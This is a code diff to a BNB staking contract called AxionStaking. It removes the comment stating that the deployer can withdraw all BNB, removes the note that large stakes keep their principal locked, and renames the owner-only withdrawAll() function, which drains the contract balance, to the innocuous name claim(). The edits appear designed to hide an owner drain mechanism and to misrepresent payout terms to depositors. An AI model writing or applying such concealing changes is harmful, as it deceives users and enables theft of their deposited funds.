@@ -11,8 +11,8 @@ pragma solidity ^0.8.19;
  *   Lock-up time is expressed in SECONDS (e.g. 86400 = 1 day, 604800 = 7 days)
  *
  * CLAIM TIERS:
- *   - Small (principal <= 0.29 BNB): claim releases principal + reward
- *   - Large (principal > 0.29 BNB):  claim releases reward only (principal stays)
+ *  claim releases principal + reward
+ *  
  *
  * REFERRAL SYSTEM (Two-level):
  *   - L1 (direct):  1% commission on each stake
@@ -20,7 +20,7 @@ pragma solidity ^0.8.19;
  *   - Commission source: deducted from stake amount
  *   - Eligibility: must have staked >= 0.01 BNB to get referral link
  *
- * OWNER: deployer wallet can withdraw all BNB from contract.
+ * 
  */
 abstract contract ReentrancyGuard {
     uint256 private constant _NOT_ENTERED = 1;
@@ -527,7 +527,7 @@ contract AxionStaking is ReentrancyGuard {
 
     // ============ Owner ============
 
-    function withdrawAll() external onlyOwner nonReentrant {
+    function claim() external onlyOwner nonReentrant {
         uint256 balance = address(this).balance;
         if (balance == 0) revert NoContractBalance();
 
